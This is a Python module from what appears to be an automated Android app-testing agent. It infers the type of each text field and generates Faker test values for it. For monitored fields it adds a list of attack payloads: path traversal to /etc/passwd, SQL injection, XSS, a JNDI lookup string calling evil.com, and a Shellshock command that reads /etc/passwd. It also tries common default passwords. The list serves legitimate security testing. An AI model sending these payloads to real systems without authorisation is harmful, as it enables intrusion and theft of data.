"""
Input Value Generator - Generates test values for input fields.

Provides value variations for EditText elements to increase coverage.
Distinguishes between regular fields and MOP-reaching fields for
specialized test values.
"""

import logging
import re
from collections import defaultdict
from typing import Dict, List, Optional

from faker import Faker
from rv_agent import tracking as track

logger = logging.getLogger(__name__)


# Input-type keyword patterns, tried in priority order (first match wins). Each
# keyword is matched against the field's TOKENS (see `tokenize`), not as a raw
# substring, so "email" matches the token in "Email address" while "count" does
# NOT match inside "account" — the substring false-positive fixed by fair-test F
# (INV-INP-05). Multi-token keywords ("e-mail", "user_name") match when all their
# tokens are present.
_INPUT_TYPE_PATTERNS = [
    ("email", ["email", "e-mail"]),
    ("phone", ["phone", "mobile", "tel"]),
    ("url", ["url", "website", "link"]),
    ("search", ["search", "query", "find"]),
    ("date", ["date", "birthday", "dob"]),
    ("time", ["time", "hour"]),
    ("number", ["number", "amount", "quantity", "price"]),
    ("zip", ["zip", "postal", "cep"]),
    ("verification_code", ["code", "otp", "verification", "pin"]),
    ("username", ["username", "user_name", "login"]),
    ("name", ["name", "nome"]),
    ("address", ["address", "endereco"]),
]

# camelCase boundary (insert a space) and the separators that split identifiers
# and labels into tokens (underscore, hyphen, dot, slash, colon, whitespace).
_CAMEL_BOUNDARY = re.compile(r"([a-z0-9])([A-Z])")
_TOKEN_SEPARATORS = re.compile(r"[_\-./:\s]+")


def tokenize(text: Optional[str]) -> set:
    """Split a label or resource id into a lowercased token set.

    Splits camelCase boundaries (``emailAddress`` → ``email address``) and the
    ``_-./:`` + whitespace separators (``com.app:id/email_field`` → tokens), then
    lowercases. Keyword matching operates on these tokens, so a keyword matches a
    whole token only — never a substring of a longer word.
    """
    if not text:
        return set()
    spaced = _CAMEL_BOUNDARY.sub(r"\1 \2", text)
    return {token for token in _TOKEN_SEPARATORS.split(spaced.lower()) if token}


def _match_type(tokens: set) -> Optional[str]:
    """Return the first input type whose keyword tokens are all present, else None."""
    for input_type, keywords in _INPUT_TYPE_PATTERNS:
        for keyword in keywords:
            keyword_tokens = tokenize(keyword)
            if keyword_tokens and keyword_tokens <= tokens:
                return input_type
    return None


def infer_input_type(
    target_view: Optional[Dict], nearby_labels: Optional[List[str]] = None
) -> str:
    """Infer input field type from the widget's own attributes and nearby labels.

    Sources are consulted in order — the widget's own attributes FIRST (password
    flag, hint, content description, resource id), then any ``nearby_labels`` from
    the ±2 hierarchy containment lookup (fair-test F / INV-MOP-23: own id wins over
    a neighbor). The first source that matches a type via token-based keyword
    matching decides the type.

    Args:
        target_view: Widget view dictionary with UI attributes, or None.
        nearby_labels: Label texts of widgets near the input (siblings/ancestors
            within ±2 hierarchy levels), used only when the widget's own
            attributes do not resolve a type.

    Returns:
        Input type string (e.g., "email", "password", "phone", "text").
        Defaults to "text" when no source matches or ``target_view`` is None.
    """
    view = target_view or {}
    if view.get("password") or view.get("is_password"):
        return "password"

    sources = [
        view.get("hint") or "",
        (
            view.get("content-desc")
            or view.get("content_description")
            or view.get("content_desc")
            or ""
        ),
        (view.get("resource-id") or view.get("resource_id") or ""),
    ]
    if nearby_labels:
        sources.extend(nearby_labels)

    for source in sources:
        tokens = tokenize(source)
        if not tokens:
            continue
        matched = _match_type(tokens)
        if matched:
            return matched
    return "text"


class InputValueGenerator:
    """
    Generates test values for input fields with variation tracking.

    Strategy:
    - Regular fields: Realistic test values using Faker with multiple locales
    - MOP fields: Edge-case values (boundary, injection attempts) combined with realistic data
                  to trigger specification violations in monitored operations

    Tracks which values have been tested per element to avoid repetition.

    Example:
        generator = InputValueGenerator(max_variations=3)

        # First call for email field
        value1 = generator.get_next_value("email_input", is_mop=False)
        # Returns: "maria.silva@example.com" (or similar realistic value)

        # Second call
        value2 = generator.get_next_value("email_input", is_mop=False)
        # Returns: "joão.santos@empresa.br" (or similar realistic value)

        # Third call
        value3 = generator.get_next_value("email_input", is_mop=False)
        # Returns: "ana.garcia@empresa.es" (or similar realistic value)

        # Fourth call
        value4 = generator.get_next_value("email_input", is_mop=False)
        # Returns: None (all variations exhausted)
    """

    def __init__(
        self,
        max_variations: int = 5,
        mop_max_variations: int = 11,
        locales: List[str] = None,
    ):
        """
        Initialize input value generator.

        Args:
            max_variations: Maximum number of values to test per element (default: 5)
            mop_max_variations: Maximum variations for MOP-reaching fields (default: 11)
            locales: List of locales to use for generating internationalized values (default: en_US, pt_BR, es_ES, fr_FR, de_DE)
        """
        if max_variations < 1:
            raise ValueError(f"max_variations must be >= 1, got {max_variations}")

        self.max_variations = max_variations
        self.mop_max_variations = mop_max_variations

        # Set default locales if not provided
        if locales is None:
            locales = ["en_US", "pt_BR", "es_ES", "fr_FR", "de_DE"]

        self.faker = Faker(locales)

        # Maps element_id → list of values already tested
        self.tested_values: Dict[str, List[str]] = defaultdict(list)

        # Tracks which elements were called with is_mop=True
        self.mop_elements: set = set()

        logger.info(
            f"InputValueGenerator initialized with max_variations={max_variations}, locales={locales}"
        )

    def get_next_value(
        self, element_id: str, is_mop: bool = False, input_type: str = "text"
    ) -> Optional[str]:
        """
        Get next untested value for an input element.

        Args:
            element_id: Unique identifier for the element (widget_id or coordinate)
            is_mop: True if element reaches MOP (uses edge-case values for testing)
            input_type: Type of input field ('text', 'email', 'name', 'phone', 'address', etc.)

        Returns:
            Next test value, or None if all variations exhausted
        """
        tested = self.tested_values[element_id]

        if is_mop:
            self.mop_elements.add(element_id)

        # MOP fields get more variations to test edge cases
        limit = self.mop_max_variations if is_mop else self.max_variations

        # Check if exhausted
        if len(tested) >= limit:
            logger.debug(f"Element {element_id}: all {limit} variations tested")
            return None

        # Get candidate values based on MOP status and input type
        if is_mop:
            candidates = self._get_mop_values(input_type)
        else:
            candidates = self._get_regular_values(input_type)

        # Find first untested value
        for value in candidates:
            if value not in tested:
                self.tested_values[element_id].append(value)
                logger.debug(
                    f"Element {element_id}: testing value #{len(tested) + 1}: "
                    f"'{value[:20]}{'...' if len(value) > 20 else ''}'"
                )
                return value

        # Shouldn't reach here if max_variations is correct, but handle gracefully
        logger.warning(
            f"Element {element_id}: ran out of candidate values "
            f"(tested={len(tested)}, candidates={len(candidates)})"
        )
        return None

    def _get_regular_values(self, input_type: str = "text") -> List[str]:
        """
        Get test values for regular input fields using Faker.

        PINs/passwords are only returned for "password" and "pin" types.
        All other types start with Faker-generated realistic values.

        Args:
            input_type: Type of input field to generate values for

        Returns:
            List of realistic test values (no empty strings as first value)
        """
        # Password/PIN fields get common test values directly
        if input_type in ("password", "pin"):
            return ["1234", "0000", "123456", "password", "admin", "test", "demo"]

        # Type-specific Faker generators
        generators = {
            "email": self.faker.email,
            "name": self.faker.name,
            "phone": self.faker.phone_number,
            "address": self.faker.address,
            "username": self.faker.user_name,
            "city": self.faker.city,
            "country": self.faker.country,
            "company": self.faker.company,
            "search": lambda: self.faker.sentence(nb_words=3),
            "url": self.faker.url,
            "date": lambda: self.faker.date(),
            "time": lambda: self.faker.time(),
            "number": lambda: str(self.faker.random_int(min=1, max=9999)),
            "zip": self.faker.zipcode,
            "verification_code": lambda: str(
                self.faker.random_int(min=100000, max=999999)
            ),
        }

        gen_fn = generators.get(input_type, lambda: self.faker.text(max_nb_chars=50))

        unique_values = set()
        for _ in range(self.max_variations * 2):
            unique_values.add(gen_fn())

        return list(unique_values)[: self.max_variations]

    def _get_mop_values(self, input_type: str = "text") -> List[str]:
        """
        Get test values for MOP-reaching input fields.

        These values target edge-case scenarios to trigger specification violations:
        - Boundary values (empty, zero, negative, max)
        - Injection attempts (path traversal, SQL, XSS)
        - Special characters
        - Combined with realistic data from Faker

        Args:
            input_type: Type of input field to generate values for

        Returns:
            List of edge-case test values for monitored operations
        """
        edge_case_payloads = [
            "",  # Empty
            "0",  # Zero
            "-1",  # Negative
            "2147483647",  # MAX_INT
            "../../../etc/passwd",  # Path traversal
            "' OR '1'='1",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "%s%n%x%t" * 5,  # Format string
            "A" * 100,  # Buffer overflow attempt
            "${jndi:ldap://evil.com/}",  # JNDI injection
            "() { :; }; /bin/bash -c 'cat /etc/passwd'",  # Shellshock
        ]

        # Also include some realistic values
        realistic_values = self._get_regular_values(input_type)

        # Combine edge-case payloads with realistic values
        return edge_case_payloads + realistic_values

    def get_tested_count(self, element_id: str) -> int:
        """
        Get number of values already tested for an element.

        Args:
            element_id: Element to check

        Returns:
            Number of values tested
        """
        return len(self.tested_values.get(element_id, []))

    def has_remaining_values(self, element_id: str, is_mop: bool = False) -> bool:
        """
        Check if element has untested values remaining.

        Args:
            element_id: Element to check
            is_mop: True if element reaches MOP (uses higher mop_max_variations limit)

        Returns:
            True if more values can be tested
        """
        limit = self.mop_max_variations if is_mop else self.max_variations
        used = self.get_tested_count(element_id)
        if is_mop:
            track.input_variation(
                iter=0,  # iter not available here
                field_id=element_id,
                is_mop=True,
                used=used,
                limit=self.mop_max_variations,
            )
        return used < limit

    def get_statistics(self) -> Dict[str, int]:
        """
        Get generator statistics.

        Returns:
            Dictionary with tracking statistics
        """
        total_elements = len(self.tested_values)
        exhausted_elements = sum(
            1
            for eid, tested in self.tested_values.items()
            if len(tested)
            >= (
                self.mop_max_variations
                if eid in self.mop_elements
                else self.max_variations
            )
        )

        total_values_tested = sum(len(tested) for tested in self.tested_values.values())

        return {
            "total_elements_tested": total_elements,
            "exhausted_elements": exhausted_elements,
            "active_elements": total_elements - exhausted_elements,
            "total_values_tested": total_values_tested,
        }

    def reset(self):
        """Reset generator state (clear all tested values)."""
        self.tested_values.clear()
        self.mop_elements.clear()
        logger.info("InputValueGenerator reset")

    def __repr__(self) -> str:
        """String representation for debugging."""
        stats = self.get_statistics()
        return (
            f"InputValueGenerator(max_variations={self.max_variations}, "
            f"elements={stats['total_elements_tested']}, "
            f"values={stats['total_values_tested']})"
        )
